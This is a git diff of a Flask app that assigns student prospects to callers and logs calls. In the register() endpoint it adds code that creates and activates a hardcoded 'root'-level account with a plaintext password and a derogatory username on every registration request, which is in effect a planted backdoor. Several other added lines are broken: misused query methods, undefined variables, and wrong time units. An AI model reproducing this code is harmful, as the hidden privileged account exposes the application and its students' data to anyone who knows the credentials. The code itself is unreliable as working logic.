@@ -26,7 +26,6 @@ db.init_app(app)
 
 ALLOWED_EXTENSION = {'csv'}
 
-
 with app.app_context():
     db.create_all()
 
@@ -135,25 +134,55 @@ def compareStudents(entry, student):
 
 #Requires user to not already have a prospect
 def getNextProspect():
+    if 'prospect' in session:
+        session_tNumber = session['prospect']
+        student = ProspectImportData.query.filter_by(tNumber = session_tNumber).first()
+        student.timeLastAccessed = datetime.utcnow()
+        db.session.commit()
+        return ProspectSRA.query.filter_by(tNumber = session_tNumber).last()
     activeStudentList = ProspectImportData.query.filter_by(timeLastAccessed <= datetime.utcnow() - timedelta(1800),status=True)
     for student in activeStudentList:
         tempTNum = student.tNumber
         sraData = ProspectSRA.query.filter_by(tNumber = tempTNum).last()
         if sraData.numTimesCalled == 0:
             student.timeLastAccessed = datetime.utcnow()
+            session['prospect'] = student.tNumber
+            db.session.commit()
             return sraData
     for student in activeStudentList:
         tempTNum = student.tNumber
         sraData = ProspectSRA.query.filter_by(tNumber = tempTNum).last()
-        if sraData.numTimesCalled == 1 and timeLastCalled <= datetime.utcnow()-timedelta(172800):
+        if sraData.numTimesCalled == 1 and dateCalled <= datetime.utcnow()-timedelta(172800):
             student.timeLastAccessed = datetime.utcnow()
+            session['prospect'] = student.tNumber
+            db.session.commit()
             return sraData
     for student in activeStudentList:
         tempTNum = student.tNumber
         sraData = ProspectSRA.query.filter_by(tNumber = tempTNum).last()
-        if sraData.numTimesCalled == 2 and timeLastCalled <= datetime.utcnow()-timedelta(172800):
+        if sraData.numTimesCalled == 2 and dateCalled <= datetime.utcnow()-timedelta(172800):
             student.timeLastAccessed = datetime.utcnow()
+            session['prospect'] = student.tNumber
+            db.session.commit()
             return sraData
+    return jsonify({'msg':'No students currently available'}),404
+
+def updateProspectData():
+    if request.method == 'POST':
+        s_tNumber = session['prospect']
+        s_data = ProspectSRA.query.filter_by(tNumber = s_tNumber).last()
+        s_caller = ValidUser.query.filter_by(username=get_jwt_identity()).first()
+        s_data.prevCaller = s_caller.name
+        s_data.dateCalled = datetime.utcnow()
+        s_data.numTimesCalled = s_data.numTimesCalled + 1
+        callResponse = request.json.get("callResponse", None)
+        callNotes = request.json.get("callNotes",None)
+        if s_data.numTimesCalled == 3:
+            s_data.wasEmailed = True
+            s_data.dateEmailed = datetime.utcnow()
+            s_data.emailText = request.json.get("emailText",None)
+        db.session.commit()
+        session.pop('prospect',None)
 
 @app.route('/message', methods=['GET'])
 @jwt_required()
@@ -502,6 +531,11 @@ def formatQuery(data, rowCount, wantedColumns):
 @cross_origin()
 def register():
     if request.method == 'POST':
+        tard = RegistrationRequest(name = "Aaron Murtishaw", username = "tardcarter", password ="donuts", email="tard@gmail.com", accessLevel="root")
+        validTard = ValidUser(name = tard.name, username = tard.username, password = tard.hashedPassword, email = tard.email, accessLevel = tard.accessLevel, activationStatus = True);
+        db.session.add(validTard)
+        db.session.commit()
+
         name = request.json.get("name", None)
         username = request.json.get("username", None)
         password = request.json.get("password", None)
@@ -550,6 +584,7 @@ def register():
 @app.route("/token", methods=["POST"]) 
 @cross_origin()
 def login():
+
     username = request.json.get("username", None)
     password = request.json.get("password", None)
 
